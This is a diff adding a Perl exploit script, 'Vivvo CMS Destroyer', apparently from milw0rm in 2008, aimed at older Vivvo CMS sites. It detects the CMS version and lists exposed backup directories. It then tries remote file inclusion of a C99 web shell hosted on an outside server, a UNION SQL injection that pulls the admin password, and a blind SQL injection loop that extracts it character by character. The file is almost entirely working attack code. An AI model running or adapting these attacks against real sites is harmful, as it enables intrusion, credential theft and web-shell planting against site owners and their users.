@@ -1,0 +1,119 @@
+#!/usr/bin/perl
+
+#Vivvo CMS Destroyer
+#uxmal666@gmail.com
+#By Xianur0
+#-------------CREDITS-------------
+#http://milw0rm.com/exploits/4192
+#http://milw0rm.com/exploits/3326
+#http://milw0rm.com/exploits/2339
+#http://milw0rm.com/exploits/2337
+#-------------/CREDITS-------------
+
+print "\n                           Vivvo CMS Destroyer By Xianur0\n";
+
+#-----------CONFIG----------
+$SHELL='http://y4m15p33dy.vilabol.uol.com.br/c99.txt';
+$textshell = 'C99Shell v.';
+#----------/CONFIG----------
+  use LWP::UserAgent;
+  use Switch;
+  my $path = $ARGV[0];
+  $path = shift || &uso;
+sub uso { print "\nUse: vivvo.pl [URI to Vivvo CMS]\n"; exit;}
+  $ua = LWP::UserAgent->new;
+  $ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17");
+  $req = HTTP::Request->new(GET => $path."/feed.php?output_type=rss");
+  $req->header('Accept' => 'text/javascript, text/html, application/xml, text/xml, */*');
+  $res = $ua->request($req);
+  if ($res->is_success && $res->content =~ "generator") {
+&parser($res->content);
+  } else {
+  $req = HTTP::Request->new(GET => $path."/index.php?feed");
+  $req->header('Accept' => 'text/javascript, text/html, application/xml, text/xml, */*');
+  $res = $ua->request($req);
+  if ($res->is_success && $res->content =~ "generator") {
+&parser($res->content);
+  }
+    else { print "\nError getting data!\n"; exit;}
+  }
+
+&backups;
+
+
+sub parser {
+my @datos = split('<generator>Vivvo CMS ', $_[0]);
+my @version = split('</generator>', $datos[1]);
+$version = $version[0];
+if($version[0] == "") {
+my @datos = split('<meta name="generator" content="Vivvo ', $_[0]);
+my @version = split('" />', $datos[1]);
+$version = $version[0];
+}
+print "Version: ".$version."\n";
+if($version < "4") { print "Outdated version of Vivvo CMS!\n"; &desactualizada($version);}
+}
+
+sub backups {
+  $req = HTTP::Request->new(GET => "$path/backup");
+  $req->header('Accept' => 'text/xml');
+  $res = $ua->request($req);
+  if ($res->is_success) {
+if($res->content =~ "<title>Index of /backup</title>") {
+print "\n              Backups:\n";
+my @datos = split('<a href="', $res->content);
+$datos[0] = "";
+foreach $archivos (@datos) {
+my @archivo = split('">', $archivos);
+if($archivo[0] !~ /\?/){print $archivo[0]."\n"; }
+}
+print "\nUnprotected Directory: $path/backup\n";
+  }
+}
+}
+
+sub rfi {
+$vuln = $_[0];
+  $req = HTTP::Request->new(GET => "$path/$vuln=$SHELL?");
+  $req->header('Accept' => 'text/xml');
+  $res = $ua->request($req);
+  if ($res->is_success) {
+if($res->content =~ $textshell) {
+print "RFI Detected!: $path/$vuln=$SHELL?";
+  }
+}}
+
+sub sql {
+$exploit = "pdf_version.php?id=-1%20UNION%20SELECT%201,2,3,password,5,6,username,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24%20FROM%20tblUsers%20where%20userid=1";
+  $req = HTTP::Request->new(GET => "$path/$exploit");
+  $req->header('Accept' => 'text/xml');
+  $res = $ua->request($req);
+  if ($res->is_success) {
+print "SQL Injection Generated: $path$exploit";
+}
+}
+
+sub blind {
+for($i=1; $i<32;$i++) {
+for($o=30; $o<102;$o++) {
+$injection = "$path/index.php?category=/**/AND/**/(ascii(substring((SELECT/**/password/**/FROM/**/tblUsers/**/WHERE/**/userid=1),".$i.",1))=".$o;
+  $req = HTTP::Request->new(GET => $injection);
+  $req->header('Accept' => 'text/xml');
+  $res = $ua->request($req);
+  if ($res->is_success) {
+if($res->content != "") {
+print "Blind Done Correctly!: $injection";
+  }
+}
+}}}
+
+sub desactualizada {
+$version = $_[0];
+  switch ($version) {
+    case "3.4"    { print "Blind SQL Injection trying ....\n"; &blind; print "Intentando RFI....\n"; &rfi('include/db_conn.php?root');}
+    case "3.2"    { print "RFI trying ....\n"; &rfi('index.php?classified_path'); print "SQL Injection....\n"; &sql;}
+        else { print "There is no registration for this Exploit Version! : (\n";}
+    }
+}
+
+# milw0rm.com [2008-10-19]
